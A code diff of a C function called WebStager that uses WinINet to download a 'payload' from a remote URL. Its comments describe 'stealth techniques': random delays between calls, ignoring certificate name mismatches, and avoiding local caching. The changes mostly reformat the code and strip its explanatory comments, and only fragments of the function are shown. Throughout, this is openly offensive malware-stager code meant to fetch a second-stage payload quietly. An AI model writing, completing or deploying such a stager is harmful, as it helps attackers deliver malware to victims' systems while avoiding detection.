@@ -4,13 +4,8 @@
 
 #pragma comment (lib, "Wininet.lib")
 
-// Download payload from a specified URL with stealth techniques
-BOOL WebStager(
-    LPCWSTR szUrl,        // URL of the payload
-    LPCWSTR szUserAgent,  // User-Agent string for connection
-    PBYTE* pPayloadBytes, // Output buffer for downloaded payload
-    SIZE_T* sPayloadSize  // Output size of downloaded payload
-) {
+// WebStager function
+BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
     BOOL bSTATE = TRUE;                  // Function execution state
     HINTERNET hInternet = NULL, hInternetFile = NULL;  // Internet connection handles
     DWORD dwBytesRead = 0;               // Bytes read in current chunk
@@ -33,13 +28,7 @@ BOOL WebStager(
     WaitForSingleObject(hRandomDelay, rand() % 500);
 
     // Open internet session with specified user agent
-    hInternet = InternetOpenW(
-        szUserAgent,
-        INTERNET_OPEN_TYPE_DIRECT,
-        NULL,
-        NULL,
-        0
-    );
+    hInternet = InternetOpenW(szUserAgent, NULL, NULL, NULL, 0);
     if (hInternet == NULL) {
         bSTATE = FALSE;
         goto _EndOfFunction;
@@ -49,11 +38,7 @@ BOOL WebStager(
     WaitForSingleObject(hRandomDelay, rand() % 400);
 
     // Open URL with stealth-focused connection flags
-    hInternetFile = InternetOpenUrlW(
-        hInternet,
-        szUrl,
-        NULL,
-        0,
+    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0,
         INTERNET_FLAG_EXISTING_CONNECT |     // Reuse existing connection
         INTERNET_FLAG_IGNORE_CERT_CN_INVALID | // Ignore certificate name mismatches
         INTERNET_FLAG_NO_CACHE_WRITE |       // Prevent local caching
